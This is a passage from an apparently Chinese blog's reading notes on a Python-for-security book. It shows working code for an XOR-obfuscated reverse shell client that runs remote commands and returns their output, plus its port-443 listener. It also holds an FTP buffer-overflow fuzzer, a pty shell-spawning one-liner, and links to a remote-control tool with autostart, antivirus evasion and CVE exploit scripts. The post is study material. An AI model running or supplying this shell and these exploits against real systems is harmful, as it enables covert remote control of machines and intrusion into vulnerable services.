这里学着点，使用了简单的异或加密。</span></span><br><span class="line">     data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">     <span class="comment"># XOR the data again with a '\x41' to get back to normal data</span></span><br><span class="line">     en_data = bytearray(data)</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_data)):</span><br><span class="line">       en_data[i] ^=<span class="number">0x41</span><span class="comment"># 异或操作</span></span><br><span class="line"></span><br><span class="line">     <span class="comment"># 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量</span></span><br><span class="line">     comm = subprocess.Popen(str(en_data), shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line">     STDOUT, STDERR = comm.communicate()</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 输出编码后的数据并且发送给指定的主机RHOST</span></span><br><span class="line">     en_STDOUT = bytearray(STDOUT)</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(len(en_STDOUT)):</span><br><span class="line">       en_STDOUT[i] ^=<span class="number">0x41</span></span><br><span class="line">     s.send(en_STDOUT)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><hr><p>上面的代码其实是很简单的。建立连接之后，对我们的的远程的传入命令进行执行。这里一个 point 是: <code>subprocess</code> 的模块的使用。</p><p><code>subprocess</code> 和 <code>os.system</code> 不同，前者可以把输出进行向变量的重定向。可以得到命令执行吼的完整的回显。然而如果使用 后者 ，只会得到 其进程 <strong>返回值</strong>， 值得注意的是，system 的返回值是 linux 的标准的左移 <strong>8位</strong> 后的值。</p><hr><p><strong>发送部分</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind((<span class="string">"0.0.0.0"</span>, <span class="number">443</span>))</span><br><span class="line">s.listen(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Listening on port 443... "</span></span><br><span class="line">(client, (ip, port)) = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">" Received connection from : "</span>, ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    command = raw_input(<span class="string">'~$ '</span>)<span class="comment"># 等待输入和打印提示符</span></span><br><span class="line">    encode = bytearray(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(encode)):</span><br><span class="line">        encode[i] ^=<span class="number">0x41</span></span><br><span class="line">    client.send(encode)</span><br><span class="line">    en_data=client.recv(<span class="number">2048</span>)</span><br><span class="line">    decode = bytearray(en_data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(decode)):</span><br><span class="line">        decode[i] ^=<span class="number">0x41</span></span><br><span class="line">        <span class="comment"># 解码并且进行打印。</span></span><br><span class="line">    <span class="keyword">print</span> decode</span><br><span class="line"></span><br><span class="line">client.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h2 id="模糊测试-（fuzzing）"><a href="#模糊测试-（fuzzing）" class="headerlink" title="模糊测试 （fuzzing）"></a>模糊测试 （fuzzing）</h2><blockquote><p>模糊测试 是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言失败，以发现可能的程序错误，比如内存泄漏。</p></blockquote><p>基于 python 实现的模糊测试的脚本。具体思想，就是提交大量的随机模拟输入，来发现系统的潜在的问题。实现思想就是，模拟用户提交，发现问题之后进行上报。书中的代码如下，一样是是自己去添加一些注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line">buff = <span class="string">'\x41'</span>*<span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">  <span class="comment">#使用"try - except"处理错误与动作</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 连接这目标主机的ftp端口 21</span></span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">2</span>)</span><br><span class="line">    s.connect((target,<span class="number">21</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Sending buffer with length: "</span>+str(len(buff))</span><br><span class="line">    <span class="comment">#发送字符串:USER并且带有测试的用户名</span></span><br><span class="line">    s.send(<span class="string">"USER "</span>+buff+<span class="string">"\r\n"</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#使用循环来递增直至长度为50</span></span><br><span class="line">    buff = buff + <span class="string">'\x41'</span>*<span class="number">50</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">except</span>: <span class="comment"># 如果连接服务器失败，我们就打印出下面的结果</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] Crash occured with buffer length: "</span>+str(len(buff)<span class="number">-50</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure><p>emmm  这个其实也是没啥好注释的了，内容简单明了，算是点开了一种妙用。</p><h2 id="内容压缩"><a href="#内容压缩" class="headerlink" title="内容压缩"></a>内容压缩</h2><ul><li><strong>py2exe</strong>     把python 文件打包成一个 exe 进行发布</li><li><strong>Web 请求及解析</strong>  Beautiful Soup和urllib/urllib2</li><li><strong>爬虫</strong> <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9zcGlkZXIucHkv" title="https://pypi.python.org/pypi/spider.py/">spider模块<i class="fa fa-external-link"></i></span> 有现成的模块可以用啦 <code>from spider import webspider as myspider</code></li><li><strong>Whois自动查询</strong> <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9jeW1ydXdob2lzLzEuMA==" title="https://pypi.python.org/pypi/cymruwhois/1.0">Whois 模块<i class="fa fa-external-link"></i></span></li><li><p><strong>Python 与 Metasploit</strong></p></li><li><p><strong>虚拟终端</strong>  和 反向shell 不同，终端是用于直接打开一个 终端程序 <code>python -c &quot;import pty;pty.spawn(&quot;/bin/bash&quot;)&quot;</code></p></li><li><p><strong><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHhjLmh0bWw=" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0xc.html">基于 Python 的远控<i class="fa fa-external-link"></i></span></strong> 这个东西虽然有 py2exe 感觉还是比较鸡肋吧，实现了添加注册表自启动，和弹shell的功能，不过有时候 之前用的 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZlaWwtRnJhbWV3b3JrL1ZlaWw=" title="https://github.com/Veil-Framework/Veil">veil<i class="fa fa-external-link"></i></span> 也是使用的 python 做的免杀。</p></li></ul><h2 id="EXP的编写"><a href="#EXP的编写" class="headerlink" title="EXP的编写"></a>EXP的编写</h2><p>这里书中列出了几个简易的 EXP 的脚本，是一件被挖掘的 RCE （远程代码执行）， 和 LFI （本地文件包含） 的漏洞。实现的是 poc 的改变实现的功能，漏洞本身原理，还是有待挖掘的。这里就简单的先列出来吧，做个小表格，对漏洞有个基础的了解。</p><table><thead><tr><th>CVE</th><th style="text-align:left">类型</th></tr></thead><tbody><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxMy5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x13.html">CVE-2014-6271<i class="fa fa-external-link"></i></span></td><td style="text-align:left">bash 远程代码执行</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxNC5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x14.html">CVE-2012-1823<i class="fa fa-external-link"></i></span></td><td style="text-align:left">php-cgi 远程代码执行</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxNi5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x16.html">CVE-2014-3704<i class="fa fa-external-link"></i></span></td><td style="text-align:left">SQL 注入</td></tr><tr><td><span class="exturl" data-url="aHR0cHM6Ly93aXphcmRmb3JjZWwuZ2l0Ym9va3MuaW8vcHktc2VjLXR1dG9yaWFsL2NvbnRlbnQvemgtY24vMHgxNS5odG1s" title="https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x15.html">CVE-2012-3152<i class="fa fa-external-link"></i></span></td><td style="text-align:left">Oracle本地文件包含</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;已经地几本了，鼓励一下自己啦。这本主要是讲 &lt;code&gt;python&lt;/code&gt; 用于安全相关的编程内容。本书的篇幅比较的短，这篇总结一下主要的内容。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;我们是愚者，我们是一只蜂 &lt;code&gt;1.6*10^9 &amp;gt; 1.6*10^9&lt;/code&gt;
      
    
    </summary>
    
      <category term="读本好书吧" scheme="https://blog.diglp.xyz/categories/%E8%AF%BB%E6%9C%AC%E5%A5%BD%E4%B9%A6%E5%90%A7/"/>
    
    
      <category term="读书笔记" scheme="https://blog.diglp.xyz/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="python" scheme="https://blog.diglp.xyz/tags/python/"/>
    
  </entry>
  
</feed>
